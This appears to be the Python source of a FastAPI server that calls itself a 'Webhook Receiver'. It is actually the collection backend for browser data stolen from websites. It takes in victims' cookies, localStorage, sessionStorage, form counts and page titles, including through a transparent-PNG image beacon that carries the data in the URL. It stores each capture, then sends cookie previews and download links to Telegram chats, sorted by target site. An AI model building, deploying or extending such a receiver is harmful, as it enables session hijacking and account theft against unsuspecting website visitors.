from contextlib import asynccontextmanager
from datetime import datetime
from typing import Any
from uuid import uuid4
import os
import multiprocessing
import asyncio
from pathlib import Path
import urllib.parse

from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
from fastapi.responses import FileResponse, Response
from starlette.middleware.cors import CORSMiddleware
from slowapi import Limiter
from slowapi.util import get_remote_address
from slowapi.middleware import SlowAPIMiddleware
from slowapi.errors import RateLimitExceeded
from dotenv import load_dotenv

load_dotenv()

DATA_DIR = Path(os.getenv("DATA_DIR", "/opt/webhook-data"))
PORT = int(os.getenv("PORT", 8443))
RATE_LIMIT = os.getenv("RATE_LIMIT", "100/minute")
MAX_BODY_SIZE = int(os.getenv("MAX_BODY_SIZE", 10_485_760))

# 1x1 transparent PNG for image beacon fallback
TRANSPARENT_PNG = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82'

limiter = Limiter(key_func=get_remote_address)

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup: init bot and start polling in process
    from .bot import init_bot
    app.state.bot_app = await init_bot()
    def run_polling():
        import asyncio
        asyncio.set_event_loop(asyncio.new_event_loop())
        app.state.bot_app.run_polling(drop_pending_updates=True)
    process = multiprocessing.Process(target=run_polling, daemon=True)
    process.start()
    yield
    # Shutdown
    if process.is_alive():
        process.terminate()

app = FastAPI(title="Webhook Receiver", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.add_middleware(SlowAPIMiddleware)
app.state.limiter = limiter
app.state.data_file = DATA_DIR / "data.json"

@app.api_route("/webhook", methods=["GET","HEAD","POST","PUT","DELETE","CONNECT","TRACE","PATCH"])
@limiter.limit(RATE_LIMIT)
async def webhook_old(request: Request):
    raise HTTPException(403, "Access denied. Use /webhook/{token} with a valid token.")

@app.api_route("/webhook/{token}", methods=["GET","HEAD","POST","PUT","DELETE","CONNECT","TRACE","PATCH"])
@limiter.limit(RATE_LIMIT)
async def webhook_endpoint(token: str, request: Request, background_tasks: BackgroundTasks):
    # Verify token
    from .storage import verify_token
    token_data = await verify_token(token)
    if not token_data:
        raise HTTPException(403, "Invalid token")
    site = token_data["site"]

    req_id = str(uuid4())
    ts = datetime.utcnow().isoformat()
    client_ip = request.client.host
    method = request.method
    full_url = str(request.url)
    headers = dict(request.headers)
    query_params = dict(request.query_params)

    if request.method == "GET":
        data_param = request.query_params.get("data", "")
        body_str = urllib.parse.unquote(data_param)
        body = body_str.encode('utf-8')
    else:
        body = await request.body()
        body_str = body.decode('utf-8')
    if len(body) > MAX_BODY_SIZE:
        raise HTTPException(413, "Payload too large")

    # Parse and prepare combined body for saving
    import json
    try:
        data = json.loads(body_str)
        summary = {
            'cookies': data.get('cookies', 'none'),
            'pageTitle': data.get('pageTitle', 'unknown'),
            'forms': len(data.get('forms', [])),
            'localStorage': f"{len(data.get('localStorage', {}))} items",
            'sessionStorage': f"{len(data.get('sessionStorage', {}))} items"
        }
        body_combined = f"Original:\n{body_str}\n\nFiltered:\n{json.dumps(summary, indent=2)}"
        body_for_save = body_combined.encode('utf-8')
    except:
        body_for_save = body  # If not JSON, save as is

# Check for duplicates (but don't skip processing)
    from .storage import is_duplicate_request
    is_duplicate = is_duplicate_request(headers, body_for_save)
    if is_duplicate:
        print(f"Duplicate request detected for {req_id}, but processing anyway.")

    # Always save to file and update stats
    from .storage import save_webhook_request, update_stats_and_recent
    save_webhook_request(req_id, ts, client_ip, method, full_url, headers, query_params, body_for_save)
    update_stats_and_recent(req_id, ts)

    # Always notify Telegram chats
    await notify_telegram_chats(req_id, client_ip, ts, method, full_url, headers, body_for_save, site, request)

    # Determine response based on method and duplicate status
    if request.method == "GET":
        return Response(content=TRANSPARENT_PNG, media_type="image/png")
    else:
        status = "duplicate" if is_duplicate else "received"
        return {"request_id": req_id, "status": status}

@app.get("/health")
async def health():
    return {"status": "ok", "data_dir": str(DATA_DIR)}

@app.get("/file/{req_id}")
@limiter.limit("10/minute")  # Rate limit downloads
async def download_file(req_id: str, request: Request):
    # Basic security: only allow if request has valid referer or something, but for now, rate limited
    from .storage import find_request_file
    file_path = await find_request_file(req_id)
    if not file_path or not file_path.exists():
        raise HTTPException(404, "File not found")
    return FileResponse(
        file_path,
        media_type="text/plain",
        filename=f"webhook_{req_id}.txt",
        headers={"Content-Disposition": f"attachment; filename=webhook_{req_id}.txt"}
    )

async def notify_telegram_chats(req_id: str, ip: str, ts: str, method: str, url: str, headers: dict, body: bytes, site: str = "default", request: Request = None):
    try:
        print(f"Notifying Telegram for request {req_id}")
        from .bot import send_to_bound_chats
        import json

        body_str = body.decode('utf-8')
        # Extract the original JSON part
        if body_str.startswith("Original:\n"):
            original_start = body_str.find("Original:\n") + len("Original:\n")
            original_end = body_str.find("\n\nFiltered:")
            if original_end == -1:
                original_json = body_str[original_start:]
            else:
                original_json = body_str[original_start:original_end]
        else:
            original_json = body_str

        # Try to parse the original JSON
        summary = {}
        try:
            data = json.loads(original_json)
            print(f"Parsed data keys: {list(data.keys())}")
            # Extract key fields
            summary['cookies'] = data.get('cookies', 'none')
            summary['pageTitle'] = data.get('pageTitle', 'unknown')
            summary['forms'] = len(data.get('forms', []))
            ls_count = len(data.get('localStorage', {}))
            ss_count = len(data.get('sessionStorage', {}))
            summary['localStorage'] = f"{ls_count} items" if ls_count else "none"
            summary['sessionStorage'] = f"{ss_count} items" if ss_count else "none"
            print(f"Summary: {summary}")
        except Exception as e:
            summary = {'error': f'Body not JSON: {str(e)}'}
            print(f"Parse error: {str(e)}")

        # Build a concise message
        msg = f"🆔 {req_id}\n📍 {ip}\n⏱️ {ts}\n📦 {method} {url.split('?')[0][:50]}...\n"
        if 'cookies' in summary and summary['cookies'] != 'none':
            # Truncate cookies if too long
            cookie_preview = summary['cookies'][:100] + '...' if len(summary['cookies']) > 100 else summary['cookies']
            msg += f"🍪 Cookies: {cookie_preview}\n"
        if 'pageTitle' in summary and summary['pageTitle'] != 'unknown':
            msg += f"📄 Page title: {summary['pageTitle']}\n"
        if 'localStorage' in summary:
            msg += f"📦 localStorage: {summary['localStorage']}\n"
        if 'sessionStorage' in summary:
            msg += f"🗃️ sessionStorage: {summary['sessionStorage']}\n"
        if 'forms' in summary and summary['forms'] > 0:
            msg += f"📝 Forms: {summary['forms']}\n"
        if 'error' in summary:
            msg += f"⚠️ {summary['error']}\n"

        download_url = f"https://{request.url.hostname}:{PORT}/file/{req_id}"
        msg += f"🔗 {download_url}"

        await send_to_bound_chats(msg, site, req_id)
        print(f"Notification sent for {req_id}")
    except Exception as e:
        print(f"Error notifying Telegram for {req_id}: {e}")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=PORT)